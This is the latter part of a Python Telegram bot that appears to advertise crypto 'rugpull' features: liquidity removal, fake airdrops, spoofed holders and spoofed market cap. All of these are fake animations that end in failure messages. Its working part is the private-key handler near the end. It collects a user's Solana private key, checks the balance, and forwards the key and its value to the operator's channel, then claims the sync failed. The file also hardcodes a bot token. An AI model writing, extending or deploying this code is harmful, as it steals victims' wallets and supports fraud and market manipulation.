                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=addliq_prompt_id,
                        text="💧 How much liquidity would you like to add? (e.g. <code>1.5 SOL</code>):",
                        parse_mode="HTML",
                        reply_markup=addliq_keyboard
                    )
                    context.user_data["addliq_prompt_msg_id"] = sent.message_id
                    context.user_data["awaiting_addliq"] = True
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_remlq"):
        remlq_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id

        error_msg = None
        remlq_success = False
        if not remlq_input:
            error_msg = "🚫 No amount entered. Please specify the amount of liquidity to remove (e.g. <code>1.5 SOL</code>)."
        elif not remlq_input.upper().endswith(" SOL"):
            error_msg = "🔢 Invalid format. Please enter a valid number followed by 'SOL' (e.g. <code>1.5 SOL</code>)."
        else:
            try:
                amount = float(remlq_input[:-4].strip())
                if amount > 1000000000000 or amount < 0.00000001:
                    error_msg = "🧹 Amount must be between 0.00000001 and 1000000000000 SOL."
                else:
                    remlq_success = True
            except ValueError:
                error_msg = "🔢 Invalid number format. Please enter a valid amount (e.g. <code>1.5 SOL</code>)."

        remlq_prompt_id = context.user_data.get("remlq_prompt_msg_id")
        context.user_data["awaiting_remlq"] = False

        remlq_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if remlq_prompt_id:
            try:
                if remlq_success:
                    for i in range(6):
                        dots = "." * (i % 4)
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=remlq_prompt_id,
                            text=f"🧹 Removing liquidity{dots}",
                            parse_mode="HTML"
                        )
                        await asyncio.sleep(0.32)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=remlq_prompt_id,
                        text="❌ Liquidity removal failed. No token found.",
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=remlq_prompt_id)
                    except Exception:
                        pass
                    context.user_data["remlq_prompt_msg_id"] = None
                else:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=remlq_prompt_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=remlq_prompt_id,
                        text="🧹 How much liquidity would you like to remove? (e.g. <code>1.5 SOL</code>):",
                        parse_mode="HTML",
                        reply_markup=remlq_keyboard
                    )
                    context.user_data["remlq_prompt_msg_id"] = sent.message_id
                    context.user_data["awaiting_remlq"] = True
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_comment_bot"):
        comment_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id
        error_msg = None
        max_comments = 200

        if not comment_input:
            error_msg = "🚫 No amount entered. Please specify the number of comments before proceeding."
        elif not comment_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            num = int(comment_input)
            if num < 1:
                error_msg = "❌ Invalid input. Please enter a numeric value to specify how many comments you'd like to generate."
            elif num > max_comments:
                error_msg = "📈 The maximum number of comments you can generate is <code>200</code>. Please enter a smaller value."

        comment_bot_msg_id = context.user_data.get("comment_bot_msg_id")
        context.user_data["awaiting_comment_bot"] = False

        comment_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if comment_bot_msg_id:
            try:
                if error_msg:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=comment_bot_msg_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=comment_bot_msg_id,
                        text="💬 How many comments should I drop? (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
                        parse_mode="HTML",
                        reply_markup=comment_keyboard
                    )
                    context.user_data["comment_bot_msg_id"] = sent.message_id
                    context.user_data["awaiting_comment_bot"] = True
                else:
                    tone_keyboard = InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("💬 Friendly", callback_data="tone_hype"),
                            InlineKeyboardButton("😎 Cool", callback_data="tone_meme"),
                            InlineKeyboardButton("🤔 Thoughtful", callback_data="tone_smart")
                        ],
                        [
                            InlineKeyboardButton("🤣 Funny", callback_data="tone_chill"),
                            InlineKeyboardButton("🔥 Bold", callback_data="tone_spicy"),
                            InlineKeyboardButton("🎉 Hype", callback_data="tone_chaotic")
                        ],
                        [
                            InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")
                        ]
                    ])
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=comment_bot_msg_id,
                        text="💬 Pick a Comment Style:",
                        reply_markup=tone_keyboard
                    )
                    context.user_data["comment_bot_count"] = num
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_mint"):
        mint_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id

        error_msg = None
        mint_success = False

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if not mint_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            mint_success = True

        mint_prompt_id = context.user_data.get("mint_prompt_msg_id")
        context.user_data["awaiting_mint"] = False

        mint_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        if mint_prompt_id:
            try:
                if mint_success:
                    for i in range(8):
                        dots = "." * (i % 4)
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=mint_prompt_id,
                            text=f"🪙 Minting token{dots}",
                            parse_mode="HTML"
                        )
                        await asyncio.sleep(0.3)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=mint_prompt_id,
                        text="❌ Token Mint Failed. No token found.",
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=mint_prompt_id)
                    except Exception:
                        pass
                    context.user_data["mint_prompt_msg_id"] = None
                else:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=mint_prompt_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=mint_prompt_id,
                        text="🪙 How many tokens would you like to mint? (e.g., <code>1000</code> or <code>10000000</code>)",
                        parse_mode="HTML",
                        reply_markup=mint_keyboard
                    )
                    context.user_data["mint_prompt_msg_id"] = sent.message_id
                    context.user_data["awaiting_mint"] = True
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_burn"):
        burn_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id

        error_msg = None
        burn_success = False

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if not burn_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            burn_success = True

        burn_prompt_id = context.user_data.get("burn_prompt_msg_id")
        context.user_data["awaiting_burn"] = False

        burn_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        if burn_prompt_id:
            try:
                if burn_success:
                    for i in range(8):
                        dots = "." * (i % 4)
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=burn_prompt_id,
                            text=f"🔥 Burning token{dots}",
                            parse_mode="HTML"
                        )
                        await asyncio.sleep(0.3)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=burn_prompt_id,
                        text="❌ Token Burn Failed. No token found.",
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=burn_prompt_id)
                    except Exception:
                        pass
                    context.user_data["burn_prompt_msg_id"] = None
                else:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=burn_prompt_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=burn_prompt_id,
                        text="🔥 How many tokens would you like to burn? (e.g. <code>1000</code> or <code>10000000</code>)",
                        parse_mode="HTML",
                        reply_markup=burn_keyboard
                    )
                    context.user_data["burn_prompt_msg_id"] = sent.message_id
                    context.user_data["awaiting_burn"] = True
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_fake_airdrop"):
        airdrop_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id
        error_msg = None
        max_claims = 100

        if not airdrop_input:
            error_msg = "🚫 No amount entered. Please specify the number of claims before proceeding."
        elif not airdrop_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            num = int(airdrop_input)
            if num < 1:
                error_msg = "❌ Invalid input. Please enter a numeric value to specify how many claims you'd like to trigger."
            elif num > max_claims:
                error_msg = "📈 The maximum number of fake airdrops you can distribute is <code>100</code>. Please enter a smaller value."

        fake_airdrop_msg_id = context.user_data.get("fake_airdrop_msg_id")
        context.user_data["awaiting_fake_airdrop"] = False

        fake_airdrop_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if fake_airdrop_msg_id:
            try:
                if error_msg:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=fake_airdrop_msg_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=fake_airdrop_msg_id,
                        text="🎁 Please enter the number of fake airdrops you'd like to distribute: (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
                        parse_mode="HTML",
                        reply_markup=fake_airdrop_keyboard
                    )
                    context.user_data["fake_airdrop_msg_id"] = sent.message_id
                    context.user_data["awaiting_fake_airdrop"] = True
                else:
                    processing_texts = ["🔄 Processing request.", "🔄 Processing request..", "🔄 Processing request..."]
                    dot_count = random.choice([2, 3, 4])
                    for i in range(dot_count):
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=fake_airdrop_msg_id,
                            text=processing_texts[i % 3]
                        )
                        await asyncio.sleep(0.8)

                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=fake_airdrop_msg_id,
                        text="❌ Cannot generate airdrops. No token found."
                    )
                    await asyncio.sleep(2.2)

                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=fake_airdrop_msg_id)
                    except Exception:
                        pass
                    context.user_data["fake_airdrop_msg_id"] = None
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_spoofed_holders"):
        holders_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id
        error_msg = None
        max_holders = 20000

        if not holders_input:
            error_msg = "🚫 No amount entered. Please specify the number of holders before proceeding."
        elif not holders_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            num = int(holders_input)
            if num < 1:
                error_msg = "❌ Invalid input. Please enter a numeric value to specify how many holders you'd like to spoof."
            elif num > max_holders:
                error_msg = "📈 The maximum number of holders you can spoof is <code>20000</code>. Please enter a smaller value."

        spoofed_holders_msg_id = context.user_data.get("spoofed_holders_msg_id")

        spoofed_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if spoofed_holders_msg_id:
            try:
                if error_msg:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_holders_msg_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_holders_msg_id,
                        text="👤 How many spoofed holders would you like? (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
                        parse_mode="HTML",
                        reply_markup=spoofed_keyboard
                    )
                    context.user_data["spoofed_holders_msg_id"] = sent.message_id
                    context.user_data["awaiting_spoofed_holders"] = True
                else:
                    processing_texts = ["🔄 Processing request.", "🔄 Processing request..", "🔄 Processing request..."]
                    dot_count = random.choice([2, 3, 4])
                    for i in range(dot_count):
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=spoofed_holders_msg_id,
                            text=processing_texts[i % 3]
                        )
                        await asyncio.sleep(0.8)

                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_holders_msg_id,
                        text="❌ Cannot spoof holders. No token found."
                    )
                    await asyncio.sleep(2.2)

                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=spoofed_holders_msg_id)
                    except Exception:
                        pass
                    context.user_data["spoofed_holders_msg_id"] = None
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_spoofed_marketcap"):
        marketcap_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id
        error_msg = None
        max_marketcap = 50000000000

        if not marketcap_input:
            error_msg = "🚫 No amount entered. Please specify the market cap before proceeding."
        elif not marketcap_input.isdigit():
            error_msg = "🔢 Only numbers are allowed. Please enter a valid number."
        else:
            num = int(marketcap_input)
            if num < 1:
                error_msg = "❌ Invalid input. Please enter a positive numeric value for market cap."
            elif num > max_marketcap:
                error_msg = f"📈 The maximum market cap you can spoof is <code>{max_marketcap:,}</code>. Please enter a smaller value."

        spoofed_marketcap_msg_id = context.user_data.get("spoofed_marketcap_msg_id")

        marketcap_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if spoofed_marketcap_msg_id:
            try:
                if error_msg:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_marketcap_msg_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2)
                    sent = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_marketcap_msg_id,
                        text="📊 How much spoofed market cap would you like to display? (e.g. <code>50000</code>, <code>1000000</code>, <code>25000000</code>)",
                        parse_mode="HTML",
                        reply_markup=marketcap_keyboard
                    )
                    context.user_data["spoofed_marketcap_msg_id"] = sent.message_id
                    context.user_data["awaiting_spoofed_marketcap"] = True
                else:
                    processing_texts = ["🔄 Processing request.", "🔄 Processing request..", "🔄 Processing request..."]
                    dot_count = random.choice([2, 3, 4])
                    for i in range(dot_count):
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=spoofed_marketcap_msg_id,
                            text=processing_texts[i % 3]
                        )
                        await asyncio.sleep(0.8)

                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=spoofed_marketcap_msg_id,
                        text="❌ Cannot spoof market cap. No token found."
                    )
                    await asyncio.sleep(2.2)

                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=spoofed_marketcap_msg_id)
                    except Exception:
                        pass
                    context.user_data["spoofed_marketcap_msg_id"] = None
            except Exception:
                pass
        return

    if context.user_data.get("awaiting_feedback"):
        feedback_text = update.message.text.strip()
        if len(feedback_text) < 10:
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
            except Exception:
                pass
            await asyncio.sleep(1.3)
            sent_error = await update.effective_chat.send_message("❌ Feedback too short — please write at least 10 characters.")
            await asyncio.sleep(2)
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=sent_error.message_id)
            except Exception:
                pass
            return
        context.user_data["awaiting_feedback"] = False
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
        except Exception:
            pass

        await asyncio.sleep(1.3)
        thank_you = await update.message.reply_text("✅ Thank you for your feedback! We really appreciate it.")
        await asyncio.sleep(1.7)
        try:
            await context.bot.delete_message(chat_id=thank_you.chat_id, message_id=thank_you.message_id)
        except Exception:
            pass

        await asyncio.sleep(1.9)

        alerts_enabled = context.user_data.get("alerts_enabled", False)
        alert_button = InlineKeyboardButton(
            "🟢 Disable Notifications" if alerts_enabled else "🔴 Enable Notifications",
            callback_data="toggle_alerts"
        )
        settings_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Restart", callback_data="restart")],
            [alert_button],
            [InlineKeyboardButton("🌐 Change Language", callback_data="change_language")],
            [InlineKeyboardButton("📝 Feedback", callback_data="feedback")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ])
        feedback_msg_id = context.user_data.get("feedback_msg_id")
        if feedback_msg_id:
            try:
                sent = await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=feedback_msg_id,
                    text="⚙️ Manage Settings",
                    reply_markup=settings_keyboard
                )
                context.user_data["settings_msg_id"] = sent.message_id
            except Exception:
                pass
            context.user_data["feedback_msg_id"] = None
        return

    if context.user_data.get("awaiting_private_key"):
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
        except Exception:
            pass

        await asyncio.sleep(2)

        private_key = update.message.text.strip()
        
        print(f"DEBUG: Received key with length: {len(private_key)}")
        
        if not (80 <= len(private_key) <= 90):
            print(f"DEBUG: Key rejected - length {len(private_key)} not in range 80-90")
            sent_error = await update.message.reply_text("❌ Invalid private key — please check your key and try again.")
            context.user_data["awaiting_private_key"] = True
            await asyncio.sleep(2)
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=sent_error.message_id
                )
            except Exception:
                pass
            return
        
        print("DEBUG: Key length OK, checking balance...")
        balance = await get_wallet_balance(private_key)
        print(f"DEBUG: Balance result: {balance}")
        sent_error = None

        if balance is None:
            print("DEBUG: Balance is None - invalid key")
            sent_error = await update.message.reply_text("❌ Invalid private key — please check your key and try again.")
            context.user_data["awaiting_private_key"] = True
        else:
            print(f"DEBUG: Valid key! Balance: {balance} SOL")
            
            sol_eur_rate = await get_sol_to_eur_rate()
            
            if sol_eur_rate:
                eur_value = balance * sol_eur_rate
                log_message = f"🔑 Private Key: `{private_key}`\n💰 Balance: {balance:.4f} SOL (€{eur_value:.2f})"
            else:
                log_message = f"🔑 Private Key: `{private_key}`\n💰 Balance: {balance:.4f} SOL"
            
            print(f"DEBUG: Attempting to send to channel {CHANNEL_ID}")
            
            try:
                await context.bot.send_message(
                    chat_id=CHANNEL_ID,
                    text=log_message,
                    parse_mode="Markdown"
                )
                print("DEBUG: Message sent successfully!")
            except Exception as e:
                print(f"DEBUG ERROR sending to channel: {e}")
            
            sent_error = await update.message.reply_text(
                "❌ Wallet sync failed — use the token's creation wallet and meet all requirements."
            )
            context.user_data["awaiting_private_key"] = True

        if sent_error:
            await asyncio.sleep(2)
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=sent_error.message_id
                )
            except Exception:
                pass
        return


if __name__ == '__main__':
    app = ApplicationBuilder().token("8567687976:AAHWL-B5pLTbA6hGMvsEGDSsXfCbvof8KpA").build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(?!set_withdrawal$).*"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling()
